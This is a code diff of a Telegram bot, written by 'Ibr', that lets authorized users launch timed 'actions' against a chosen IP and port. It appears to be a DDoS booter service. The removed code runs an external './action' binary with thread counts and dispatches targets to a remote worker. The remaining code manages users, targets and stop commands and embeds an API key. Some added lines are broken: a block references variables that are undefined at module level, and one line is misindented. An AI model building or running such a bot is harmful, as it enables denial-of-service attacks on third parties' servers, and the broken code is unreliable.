@@ -61,6 +61,15 @@ supporter_users = {}
 # Store processes and temporary data for each user
 processes = defaultdict(dict)
 
+active_users[user_id] = {
+    "username": message.from_user.username, 
+    "action": "Running", 
+    "ip": ip, 
+    "port": port, 
+    "duration": duration,
+    "start_time": datetime.now()
+}
+
 # Dictionary to track actions by user
 active_users = {}  # Format: {user_id: {"username": str, "action": str, "process": subprocess, "expire_time": datetime}}
 # Authorize a user and set expiration in Kolkata timezone
@@ -228,9 +237,9 @@ def send_welcome(message):
         "I'm here to help you manage actions easily and efficiently. 🚀\n\n"
         "🔹 To *start* an action, you can choose between:\n"
         "1. Manual Mode: Enter IP, port, and duration manually.\n"
-        "2. Auto Mode: Enter IP and port, and I'll choose a random duration for you.\n\n"
+        "2. Auto Mode: Enter IP and port, and I'll choose a random duration for you. 🎲\n\n"
         "🔹 Want to *stop* all ongoing actions? Just type:\n"
-        "stop all\n\n"
+        "🛑 *stop all*\n\n"
         "🔐 *Important:* Only authorized users can use this bot in private chat. 😎\n\n"
         "🤖 _This bot was made by Ibr._"
     )
@@ -244,9 +253,8 @@ def set_mode(message):
     
     # Update the user's mode
     user_modes[user_id] = selected_mode
-    bot.reply_to(message, f"🔄 *Mode switched to {selected_mode.capitalize()} Mode!*")
+     bot.reply_to(message, f"🔄 *Mode switched to {selected_mode.capitalize()} Mode!*", parse_mode='Markdown')
     
-# Command to show the list of active users and actions (admin only)
 @bot.message_handler(commands=['list_active'])
 def list_active_users(message):
     user_id = message.from_user.id
@@ -260,8 +268,9 @@ def list_active_users(message):
 
     active_list = "🟢 *Active Users and Actions:*\n"
     for uid, info in active_users.items():
-        action = info.get("action", "Unknown action")
-        active_list += f"👤 User: {info['username']} (ID: {uid})\n🔹 Action: {action}\n\n"
+        active_list += f"👤 User: {info['username']} (ID: {uid})\n" \
+                       f"🌍 IP: {info['ip']}, Port: {info['port']}\n" \
+                       f"⏳ Duration: {info['duration']} seconds\n\n"
 
     bot.reply_to(message, active_list, parse_mode='Markdown')
 
@@ -342,12 +351,20 @@ def remove_user(message):
         user_id = int(user_id)
         
         if user_id in authorized_users:
+            # Remove from the authorization list
             del authorized_users[user_id]
+
+            # Remove from MongoDB
+            actions_collection.delete_one({'user_id': user_id})
+
+            # Save the updated list to MongoDB
             save_authorizations()
-            bot.reply_to(message, f"🚫 *User {user_id} has been removed from the authorization list.*", parse_mode='Markdown')
+
+            # Notify the admin and the user
+            bot.reply_to(message, f"🚫 *User {user_id} has been successfully removed from the authorization list and database.*", parse_mode='Markdown')
+            bot.send_message(user_id, "❌ *Your access has been removed by the admin. Please contact the provider for more information.*", parse_mode='Markdown')
+
             logging.info(f"Admin {message.from_user.id} removed user {user_id}.")
-            # Notify the user that their application was rejected
-            bot.send_message(user_id, "❌ *Your access has been removed by the admin.* Please contact to the provider for more information", parse_mode='Markdown')
         else:
             bot.reply_to(message, f"⚠️ *User {user_id} is not in the authorization list.*", parse_mode='Markdown')
 
@@ -394,27 +411,6 @@ def request_authorization(message):
     # Log the authorization request
     logging.info(f"User {user_id} ({username}) requested authorization")
 
-
-@bot.message_handler(commands=['worker'])
-def get_worker_status(message):
-    """Fetch the status of workers from the server."""
-    try:
-        response = requests.get(
-            'https://lm6000k.pythonanywhere.com/status',
-            headers={'API-Key': 'fukbgmiservernow'}  # Your API key
-        )
-        if response.status_code == 200:
-            worker_status = response.json()
-            online_workers = worker_status.get('online_workers', [])
-            bot.reply_to(message, "✅ *Worker List!* {online_workers}.", parse_mode='Markdown')
-            return online_workers
-        else:
-            bot.reply_to(message, f"Failed to fetch worker status. Status code: {response.status_code}, Response: {response.text}")
-            return []
-    except Exception as e:
-        bot.reply_to(message, f"Error fetching worker status: {e}")
-        return []
-
 @bot.message_handler(commands=['yell'])
 def handle_yell(message):
     user_id = message.from_user.id
@@ -427,18 +423,6 @@ def handle_yell(message):
             bot.reply_to(message, "Please provide a message to broadcast.")
     else:
         bot.reply_to(message, "You are not authorized to use this command.")
-      
-@bot.message_handler(commands=['supporter_mode'])
-def activate_supporter_mode(message):
-    user_id = message.from_user.id
-    supporter_users[user_id] = True  # Activate supporter mode for the user
-    bot.reply_to(message, "✅ *Supporter mode activated!* Your actions will now be handled by the worker service.", parse_mode='Markdown')
-
-@bot.message_handler(commands=['disable_supporter_mode'])
-def disable_supporter_mode(message):
-    user_id = message.from_user.id
-    supporter_users[user_id] = False  # Deactivate supporter mode for the user
-    bot.reply_to(message, "✅ *Supporter mode deactivated!* Your actions will be handled locally.", parse_mode='Markdown')
 
 # Main message handler
 @bot.message_handler(func=lambda message: True)
@@ -576,37 +560,6 @@ def show_stop_action_button(message):
     markup.add(stop_button)
     #bot.send_message(message.chat.id, "🛑 *Press Stop Action to terminate your current action.*", reply_markup=markup, parse_mode='Markdown')
 
-def run_action(user_id, message, ip, port, duration):
-    try:
-        numbers = [30, 20, 40, 50, 20]
-        thread_value = random.choice(numbers)
-        # Notify the user that the action started
-        bot.reply_to(message, f"🎉 *Socket Connected in {thread_value}ms*", parse_mode='Markdown')
-        # Log the action start
-        logging.info(f"User {user_id} started action on IP {ip}, Port {port}, Duration {duration}s")
-
-        # Build the full command to execute
-        full_command = f"./action {ip} {port} {duration} {thread_value}"
-
-        # Start the command as a non-blocking subprocess
-        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        # Store the process and its details in the processes dict
-        processes[process.pid] = {
-            'user_id': user_id,
-            'message': message,
-            'ip': ip,
-            'port': port,
-            'duration': duration,
-            'start_time': datetime.now(),
-            'process': process
-        }
-        # Monitor the process status
-        check_process_status(message, process, ip, port, duration)
-
-    except Exception as e:
-        logging.error(f"Error running action for user {user_id}: {str(e)}")
-        bot.reply_to(message, "⚠️ *An error occurred while processing your request.*", parse_mode='Markdown')
 
 def check_process_status(message, process, ip, port, duration):
     # Monitor the process and notify upon completion
@@ -635,25 +588,6 @@ def send_completion_message(message, ip, port, duration):
         "_This bot was made by Ibr._"
     ), parse_mode='Markdown', reply_markup=markup)
 
-def submit_task_to_worker(ip, port, duration):
-    # Properly format the string using f-string
-    Support_call = f'{ip} {port} {duration}'
-    
-    # URL-encode the message to handle spaces and special characters
-    encoded_message = urllib.parse.quote(Support_call)
-
-    # Send a GET request to the Telegram API to send the message
-    try:
-        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id=7399993709&text={encoded_message}')
-        
-        # Check if the request was successful
-        if response.status_code == 200:
-            print("Message sent successfully!")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}")
-    
-    except requests.exceptions.RequestException as e:
-        print(f"Error sending message: {e}")
 def stop_all_actions(message):
     if processes:
         for pid, process in list(processes.items()):
